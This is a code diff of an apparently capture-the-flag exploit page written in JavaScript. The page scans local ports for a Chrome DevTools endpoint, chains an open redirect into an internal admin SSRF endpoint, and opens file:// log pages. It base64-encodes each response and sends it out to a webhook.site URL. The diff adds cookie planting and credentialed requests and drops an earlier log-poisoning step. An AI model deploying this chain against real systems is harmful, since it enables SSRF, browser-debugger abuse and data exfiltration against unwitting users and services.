@@ -1,4 +1,6 @@
 <script>
+    document.cookie = '$$COOKIEVAL'; // generated on the fly and replaced
+
     const totalPorts = 66000 - 30000;
     const batches = 300;
     const portsPerSecond = totalPorts / batches;
@@ -32,9 +34,9 @@
     async function downloadFileAndBlock(port) {
         let cdpPort = port;
 
-        async function handleRsp(prom) {
+        async function handleRsp(prom, includeCookies) {
             try {
-                let rsp = await fetch(prom);
+                let rsp = await fetch(prom, includeCookies ? { credentials: 'include' } : {});
                 let text = await rsp.text();
 
                 await fetch('https://webhook.site/1a8c08ae-3b83-4795-be29-8fba3587acdc?data=' + btoa(text), { mode: 'no-cors' });
@@ -45,13 +47,7 @@
         }
 
         async function start() {
-            // Poison log file
-            let rsp1 = await handleRsp('/' + encodeURIComponent('<title>'));
-            await fetch('https://httpbin.org/delay/1', { mode: 'no-cors' });
-            await handleRsp('/' + encodeURIComponent('</title>'));
-            await fetch('https://httpbin.org/delay/1', { mode: 'no-cors' });
-
-            let rsp2 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/log.htm')));
+            let rsp2 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?method=PUT&url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/new?file:///app/logs/log-' + document.cookie.replace('user=', '') + '.htm')));
             setTimeout(async () => {
                 let rsp3 = await handleRsp('https://httpbin.org/redirect-to?url=' + encodeURIComponent('http://localhost:8080/admin/doHttpReq?url=' + encodeURIComponent('http://127.0.0.1:' + cdpPort + '/json/list')));
                 console.log(rsp3);
